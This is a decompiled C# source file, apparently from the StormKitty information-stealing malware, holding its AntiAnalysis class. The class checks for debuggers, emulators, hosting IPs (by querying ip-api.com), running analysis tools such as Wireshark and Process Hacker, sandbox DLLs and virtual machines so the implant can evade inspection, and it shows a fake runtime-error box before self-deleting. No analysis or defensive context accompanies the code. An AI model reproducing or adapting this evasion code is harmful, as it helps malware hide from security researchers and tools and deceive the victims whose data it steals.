﻿using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace StormKitty.Implant
{
	// Token: 0x0200006C RID: 108
	internal sealed class AntiAnalysis
	{
		// Token: 0x060001A8 RID: 424
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		// Token: 0x060001A9 RID: 425
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x060001AA RID: 426 RVA: 0x0000D2B8 File Offset: 0x0000B4B8
		private static bool Debugger()
		{
			bool result = false;
			try
			{
				AntiAnalysis.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref result);
				return result;
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x060001AB RID: 427 RVA: 0x0000D2F4 File Offset: 0x0000B4F4
		private static bool Emulator()
		{
			try
			{
				long ticks = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - ticks < 10L)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x060001AC RID: 428 RVA: 0x0000D348 File Offset: 0x0000B548
		private static bool Hosting()
		{
			try
			{
				return new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting").Contains("true");
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x060001AD RID: 429 RVA: 0x0000D39C File Offset: 0x0000B59C
		private static bool Processes()
		{
			Process[] processes = Process.GetProcesses();
			string[] source = new string[]
			{
				"processhacker",
				"netstat",
				"netmon",
				"tcpview",
				"wireshark",
				"filemon",
				"regmon",
				"cain"
			};
			foreach (Process process in processes)
			{
				if (source.Contains(process.ProcessName.ToLower()))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060001AE RID: 430 RVA: 0x0000D424 File Offset: 0x0000B624
		private static bool SandBox()
		{
			string[] array = new string[]
			{
				"SbieDll.dll",
				"SxIn.dll",
				"Sf2.dll",
				"snxhk.dll",
				"cmdvrt32.dll"
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (AntiAnalysis.GetModuleHandle(array[i]).ToInt32() != 0)
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060001AF RID: 431 RVA: 0x0000D484 File Offset: 0x0000B684
		private static bool VirtualBox()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
			{
				if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x0000D630 File Offset: 0x0000B830
		public static bool Run()
		{
			if (Config.AntiAnalysis == "1")
			{
				if (AntiAnalysis.Hosting())
				{
					return true;
				}
				if (AntiAnalysis.Processes())
				{
					return true;
				}
				if (AntiAnalysis.VirtualBox())
				{
					return true;
				}
				if (AntiAnalysis.SandBox())
				{
					return true;
				}
				if (AntiAnalysis.Emulator())
				{
					return true;
				}
				if (AntiAnalysis.Debugger())
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x0000D688 File Offset: 0x0000B888
		public static void FakeErrorMessage()
		{
			string text = StringsCrypt.GenerateRandomData("1");
			text = "0x" + text.Substring(0, 5);
			MessageBox.Show("Exit code " + text, "Runtime error", MessageBoxButtons.RetryCancel, MessageBoxIcon.Hand);
			SelfDestruct.Melt();
		}
	}
}
